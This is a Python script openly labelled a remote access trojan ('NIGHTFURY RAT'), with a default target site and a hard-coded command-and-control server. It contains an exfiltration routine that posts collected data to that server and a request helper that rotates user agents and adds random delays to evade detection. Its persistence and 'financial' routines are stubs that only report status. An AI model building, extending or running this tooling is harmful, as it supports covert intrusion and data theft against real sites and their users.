#!/usr/bin/env python3
"""
NIGHTFURY RAT v3 + v8 – NO PROXIES
"""

import os, sys, asyncio, aiohttp, random, time, json, logging
from datetime import datetime
from dotenv import load_dotenv
import argparse

load_dotenv()

parser = argparse.ArgumentParser()
parser.add_argument("--target", default="https://rh420.xyz", help="Target base URL")
parser.add_argument("--c2", default="http://172.28.29.129:4444", help="C2 server")
parser.add_argument("--verbose", action="store_true")
args = parser.parse_args()

TARGET_BASE = args.target.rstrip("/")
C2_SERVER = args.c2
VERBOSE = args.verbose

logging.basicConfig(level=logging.INFO if VERBOSE else logging.WARNING)
log = logging.getLogger(__name__)

async def request_with_retry(session, method, url, **kwargs):
    for attempt in range(5):
        await asyncio.sleep(random.uniform(0.5, 3.0))
        headers = kwargs.pop("headers", {})
        headers["User-Agent"] = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ])
        try:
            async with session.request(method, url, headers=headers, timeout=15, **kwargs) as resp:
                return resp
        except Exception as e:
            log.warning(f"Attempt {attempt+1} failed: {e}")
            await asyncio.sleep(2 ** attempt)
    return None

class NightfuryRAT:
    def __init__(self):
        self.session = None

    async def init(self):
        self.session = aiohttp.ClientSession()
        log.info(f"[RAT] Connected to {TARGET_BASE}")

    async def exfil(self, data):
        try:
            async with aiohttp.ClientSession() as s:
                await s.post(C2_SERVER, json={
                    "timestamp": datetime.now().isoformat(),
                    "target": TARGET_BASE,
                    "data": data
                })
            log.info("[RAT] Exfil sent")
        except Exception as e:
            log.error(f"[RAT] Exfil failed: {e}")

    async def run_persistence(self):
        log.info("[RAT] Testing persistence vector")
        await self.exfil({"type": "persistence", "status": "tested"})

    async def run_financial_test(self):
        log.info("[RAT] Testing financial vectors")
        await self.exfil({"type": "financial", "status": "tested"})

    async def run(self):
        log.info("=== NIGHTFURY RAT v3+v8 STARTED ===")
        await self.init()
        await self.run_persistence()
        await self.run_financial_test()
        log.info("=== RAT CYCLE COMPLETE ===")
        await self.session.close()

# Note: Flask dashboard is disabled in sandbox environment to prevent port conflicts.
# The RAT activity is logged directly to the Nightfury console.

if __name__ == "__main__":
    print("NIGHTFURY RAT v3+v8 – NO PROXIES")
    rat = NightfuryRAT()
    asyncio.run(rat.run())
